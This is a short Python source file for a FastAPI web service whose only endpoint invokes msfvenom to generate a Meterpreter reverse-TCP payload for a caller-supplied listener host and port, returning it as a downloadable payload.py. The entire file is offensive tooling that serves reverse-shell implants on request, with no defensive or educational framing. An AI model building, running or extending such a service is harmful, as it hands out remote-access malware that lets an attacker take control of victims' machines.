from fastapi import APIRouter, HTTPException
from fastapi.responses import StreamingResponse
import subprocess
import io
from Data.data import PayloadInfo

router = APIRouter()
@router.post("/generate_payload")
async def generate_payload(info:PayloadInfo):
    command = [
        "msfvenom",
        "-p", "python/meterpreter/reverse_tcp",
        f"LHOST={info.LHOST}",
        f"LPORT={info.LPORT}",
        "-f", "raw"
    ]

    try:
        process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        payload = process.stdout

        payload = io.BytesIO(payload.encode('utf-8'))

        return StreamingResponse(payload, media_type='application/octet-stream', headers={'Content-Disposition': 'attachment; filename="payload.py"'})
    except subprocess.CalledProcessError as e:
        raise HTTPException(status_code=500, detail=f"Error: {e.stderr}")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"There was an error while generating the payload.")

